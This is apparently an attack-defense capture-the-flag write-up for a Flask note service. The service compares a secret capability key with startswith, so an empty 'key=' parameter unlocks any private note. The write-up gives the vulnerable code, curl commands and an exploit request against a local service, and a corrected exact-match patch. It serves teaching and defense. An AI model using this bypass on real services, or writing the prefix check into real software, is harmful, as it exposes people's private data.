# Memo Drop — writeup

## Summary

- Stack: Python and Flask.
- Vulnerability: broken access control.
- Root cause: a capability token is checked as a prefix instead of an exact value.
- Payload: an empty `key` parameter.
- Canonical exploit: [`jury/exploit.py`](../../tasks/round-1/memo-drop/jury/exploit.py).

## Service design

`POST /api/notes` creates a private note and returns two random values: a public note `id` and a secret capability `key`. Recent IDs are listed by `GET /api/recent`, but their keys are not disclosed. Knowing an ID alone should not grant access.

A note is read with:

```text
GET /api/notes/<id>?key=<capability>
```

The jury stores ten flags through this normal creation endpoint.

## Vulnerable code

The bug is in [`service/app.py`](../../tasks/round-1/memo-drop/service/app.py):

```python
supplied_key = request.args.get("key", "")

if not note["key"].startswith(supplied_key):
    return {"error": "invalid capability"}, 403
```

`startswith` is not an equality check. Every string starts with an empty string:

```python
"any-secret-capability".startswith("") is True
```

If `key` is omitted or sent as `key=`, Flask supplies `""`. The rejection condition becomes false and the private note is returned.

## Manual exploitation

List note IDs:

```bash
curl -s http://127.0.0.1:8000/api/recent
```

Example response:

```json
[{"id":"7f32a0c46e2b"}]
```

Read a note with an empty key:

```bash
curl -s 'http://127.0.0.1:8000/api/notes/7f32a0c46e2b?key='
```

Repeat this for recent IDs and keep values matching `[A-Z0-9]{32}`.

## Canonical exploit

The exploit requests `/api/recent`, reads every note with `key=`, and prints all `text` values matching the flag format. The critical request is:

```python
urllib.request.urlopen(f"{target}/api/notes/{note['id']}?key=")
```

No brute force or race condition is required.

## Correct patch

Require a non-empty exact match:

```python
import secrets

supplied_key = request.args.get("key", "")
if not supplied_key or not secrets.compare_digest(note["key"], supplied_key):
    return {"error": "invalid capability"}, 403
```

`compare_digest` is not required to solve the challenge, but it is appropriate for comparing secrets.

[`jury/checker.py`](../../tasks/round-1/memo-drop/jury/checker.py) creates a note and reads it with the complete key returned by the server, so exact comparison preserves legitimate behavior. Removing the read endpoint or always returning `403` fails the checker.

## Takeaway

This is not weak randomness or token brute force. The bypass comes entirely from the semantics of `startswith`: the empty string is a prefix of every string.
